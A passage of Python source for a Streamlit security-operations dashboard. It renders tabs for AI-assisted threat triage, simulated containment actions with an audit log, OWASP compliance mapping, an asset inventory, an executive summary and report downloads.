    triage_source = st.radio("Triage subject", ["Network Event", "Code Finding"], horizontal=True)

    if triage_source == "Network Event" and not df_events.empty:
        selected_event_id = st.selectbox("Select event", df_events["event_id"].unique())
        selected_event = next(e for e in events if e.event_id == selected_event_id)
        st.markdown(f"**Target Asset:** `{selected_event.target_asset}` | **Source IP:** `{selected_event.source_ip}`")
        st.code(selected_event.raw_payload, language="sql")
        context_label = f"Network event on {selected_event.target_asset}"
        payload_text = selected_event.raw_payload
        risk_score = selected_event.anomaly_score

    elif triage_source == "Code Finding" and findings:
        options = [f"{f.finding_id} — {f.title}" for f in findings]
        picked = st.selectbox("Select finding", options)
        picked_finding = findings[options.index(picked)]
        st.code(picked_finding.matched_snippet, language="python")
        context_label = f"Code finding: {picked_finding.title} ({picked_finding.cwe})"
        payload_text = picked_finding.matched_snippet
        risk_score = picked_finding.cvss_estimate * 10
    else:
        st.info("No data available for this triage subject yet.")
        context_label, payload_text, risk_score = "", "", 0.0

    if payload_text and st.button("🧠 Run Deep AI Analysis", type="primary"):
        with st.spinner("Analyzing via Sentinel AI triage engine..."):
            orchestrator = LLMTriageOrchestrator(
                provider=llm_provider, api_key=api_key, model_name=model_choice, local_host=local_host,
            )
            report = orchestrator.execute_triage(context_label, payload_text, risk_score)

            st.markdown("<div class='sentinel-card'>", unsafe_allow_html=True)
            st.markdown(f"#### Threat Level: <span class='neon-red'>{report.threat_level}</span>", unsafe_allow_html=True)
            st.markdown(f"**Attack Vector:** {report.attack_vector}")
            st.markdown(f"**Impact:** {report.impact_assessment}")
            st.markdown("**Actionable Remediation:**")
            for step in report.actionable_remediation:
                st.markdown(f"- {step}")
            st.markdown("</div>", unsafe_allow_html=True)

# ------------------------------------------------------------------------
# TAB: CONTAINMENT
# ------------------------------------------------------------------------
with tab_contain:
    st.markdown("### ⚡ Simulated Active Containment Playbooks")
    st.caption("These actions are simulated for demo/training purposes — wire `_notify_webhook` to real infra APIs for production use.")

    c1, c2 = st.columns(2)

    with c1:
        st.markdown("<div class='sentinel-card'>", unsafe_allow_html=True)
        st.markdown("#### 🎯 Response Actions")
        default_ip = df_events.iloc[-1]["source_ip"] if not df_events.empty else "0.0.0.0"
        default_asset = df_events.iloc[-1]["target_asset"] if not df_events.empty else "unknown-asset"
        target_ip = st.text_input("Target IP Address", value=default_ip)
        target_asset = st.text_input("Target Workload / Asset", value=default_asset)
        target_file = st.text_input("Target File (for quarantine)", value="suspicious_upload.exe")

        b1, b2, b3 = st.columns(3)
        if b1.button("Block IP"):
            res = containment.block_ip_firewall(target_ip)
            st.success(res["details"])
        if b2.button("Isolate Pod"):
            res = containment.isolate_k8s_pod(target_asset)
            st.warning(res["details"])
        if b3.button("Revoke Tokens"):
            res = containment.revoke_api_tokens(target_asset)
            st.error(res["details"])

        b4, b5 = st.columns(2)
        if b4.button("Quarantine File"):
            res = containment.quarantine_file(target_file)
            st.info(res["details"])
        if b5.button("Force Password Reset"):
            res = containment.force_password_reset(target_asset)
            st.warning(res["details"])
        st.markdown("</div>", unsafe_allow_html=True)

    with c2:
        st.markdown("### 📜 Action Audit Log")
        history = containment.get_action_history()
        if history:
            st.dataframe(pd.DataFrame(history), use_container_width=True)
        else:
            st.info("No containment actions triggered yet.")

# ------------------------------------------------------------------------
# TAB: COMPLIANCE MAPPING
# ------------------------------------------------------------------------
with tab_compliance:
    st.markdown("### 📋 OWASP Top 10 (2021) Compliance Mapping")
    st.caption("Every CWE-tagged finding is rolled up into its corresponding OWASP Top 10 category for audit-friendly reporting.")

    if findings:
        coverage = compliance_mapper.coverage_summary(findings)
        cov_df = pd.DataFrame(list(coverage.items()), columns=["OWASP Category", "Finding Count"])
        fig_cov = px.bar(
            cov_df, x="Finding Count", y="OWASP Category", orientation="h",
            color="Finding Count", color_continuous_scale="Reds", height=420,
        )
        fig_cov.update_layout(
            paper_bgcolor="rgba(0,0,0,0)", plot_bgcolor="#111827", font_color="#c9d1d9",
            xaxis=dict(gridcolor="#1f2937"), yaxis=dict(gridcolor="#1f2937"),
        )
        st.plotly_chart(fig_cov, use_container_width=True)

        st.markdown("#### Detail by Category")
        for category, count in coverage.items():
            with st.expander(f"{category} — {count} finding(s)"):
                cat_findings = [f for f in findings if compliance_mapper.map_finding(f.cwe) == category]
                for f in cat_findings:
                    st.markdown(f"- **{f.rule_id}** ({f.severity}) — {f.title} · `{f.file_name}:{f.line_number}`")
    else:
        st.info("Run a code scan to see compliance coverage here.")

# ------------------------------------------------------------------------
# TAB: ASSET INVENTORY
# ------------------------------------------------------------------------
with tab_assets:
    st.markdown("### 🗄️ Asset Inventory (Lightweight CMDB)")
    st.caption("Gives findings and network events organizational context — who owns what, and how exposed it is.")

    assets = asset_inventory.all_assets()
    df_assets = pd.DataFrame([a.model_dump() for a in assets])
    st.dataframe(df_assets, use_container_width=True)

    exp_summary = asset_inventory.exposure_summary()
    if exp_summary:
        fig_exp = px.pie(
            names=list(exp_summary.keys()), values=list(exp_summary.values()),
            color_discrete_sequence=["#f87171", "#34d399"], height=300,
        )
        fig_exp.update_layout(paper_bgcolor="rgba(0,0,0,0)", font_color="#c9d1d9")
        st.plotly_chart(fig_exp, use_container_width=True)

    st.markdown("#### ➕ Register a New Asset")
    with st.form("register_asset_form"):
        col_a, col_b = st.columns(2)
        with col_a:
            new_id = st.text_input("Asset ID", value=f"AST-{len(assets) + 1:03d}")
            new_name = st.text_input("Name", value="new-service")
            new_type = st.selectbox("Type", ["Web Service", "Database", "K8s Workload", "API Gateway", "Cache", "Message Queue"])
        with col_b:
            new_criticality = st.selectbox("Criticality", ["Critical", "High", "Medium", "Low"])
            new_owner = st.text_input("Owner Team", value="Platform Security")
            new_env = st.selectbox("Environment", ["Production", "Staging", "Development"])
        new_exposure = st.radio("Exposure", ["Internet-facing", "Internal-only"], horizontal=True)
        submitted = st.form_submit_button("Register Asset")
        if submitted:
            asset_inventory.register(Asset(
                asset_id=new_id, name=new_name, asset_type=new_type,
                criticality=new_criticality, owner=new_owner,
                environment=new_env, exposure=new_exposure,
            ))
            st.success(f"Registered asset {new_id} ({new_name}).")
            st.rerun()

# ------------------------------------------------------------------------
# TAB: EXECUTIVE SUMMARY
# ------------------------------------------------------------------------
with tab_exec:
    st.markdown("### 📈 Executive Summary")
    st.caption("A plain-English rollup of current posture, suitable for non-technical stakeholders.")

    summary_text = exec_summary_gen.summarize(findings, dep_findings, events, containment.get_action_history())
    st.markdown("<div class='sentinel-card'>", unsafe_allow_html=True)
    st.markdown(summary_text.replace("\n", "  \n"))
    st.markdown("</div>", unsafe_allow_html=True)

    st.markdown("#### 📉 Scan History Trend")
    history = st.session_state.scan_history
    if history:
        df_hist = pd.DataFrame(history)
        fig_hist = go.Figure()
        fig_hist.add_trace(go.Scatter(x=df_hist["timestamp"], y=df_hist["risk_score"],
                                       mode="lines+markers", name="Risk Score", line=dict(color="#22d3ee")))
        fig_hist.add_trace(go.Scatter(x=df_hist["timestamp"], y=df_hist["critical"],
                                       mode="lines+markers", name="Critical Findings", line=dict(color="#f87171")))
        fig_hist.update_layout(
            paper_bgcolor="rgba(0,0,0,0)", plot_bgcolor="#111827", font_color="#c9d1d9",
            xaxis=dict(gridcolor="#1f2937"), yaxis=dict(gridcolor="#1f2937"), height=320,
            legend=dict(orientation="h"),
        )
        st.plotly_chart(fig_hist, use_container_width=True)
    else:
        st.info("Run more than one scan to see a trend line over time.")

    st.download_button(
        "⬇️ Download Executive Summary (TXT)", data=summary_text,
        file_name=f"sentinel_exec_summary_{datetime.now().strftime('%Y%m%d_%H%M')}.txt", mime="text/plain",
    )

# ------------------------------------------------------------------------
# TAB: REPORTS
# ------------------------------------------------------------------------
with tab_report:
    st.markdown("### 📄 Export Consolidated Report")
    report_name = st.text_input("Report name", value=f"sentinel_report_{datetime.now().strftime('%Y%m%d_%H%M')}")

    st.markdown(f"- Code findings included (regex engine): **{len(findings)}**")
    st.markdown(f"- Semantic findings included (AST/taint engine): **{len(semantic_findings)}**")
    st.markdown(f"- Dependency findings included: **{len(dep_findings)}**")

    json_report = reporter.build_json_report(report_name, findings, dep_findings)
    report_dict = json.loads(json_report)
    report_dict["semantic_findings"] = [f.to_dict() for f in semantic_findings]
    report_dict["summary"]["total_semantic_findings"] = len(semantic_findings)
    json_report = json.dumps(report_dict, indent=2)

    st.download_button(
        "⬇️ Download JSON Report", data=json_report,
        file_name=f"{report_name}.json", mime="application/json",
    )

    if semantic_findings:
        csv_buf_sem = io.StringIO()
        pd.DataFrame([f.to_dict() for f in semantic_findings]).to_csv(csv_buf_sem, index=False)
        st.download_button(
            "⬇️ Download Semantic Findings (CSV)", data=csv_buf_sem.getvalue(),
            file_name=f"{report_name}_semantic_findings.csv", mime="text/csv",
        )

    if findings:
        csv_buf = io.StringIO()
        reporter.findings_to_dataframe(findings).to_csv(csv_buf, index=False)
        st.download_button(
            "⬇️ Download Code Findings (CSV)", data=csv_buf.getvalue(),
            file_name=f"{report_name}_code_findings.csv", mime="text/csv",
        )

    if dep_findings:
        csv_buf2 = io.StringIO()
        pd.DataFrame([d.model_dump() for d in dep_findings]).to_csv(csv_buf2, index=False)
        st.download_button(
            "⬇️ Download Dependency Findings (CSV)", data=csv_buf2.getvalue(),
            file_name=f"{report_name}_dependency_findings.csv", mime="text/csv",
        )

    st.markdown("---")
    st.json(json.loads(json_report)["summary"])
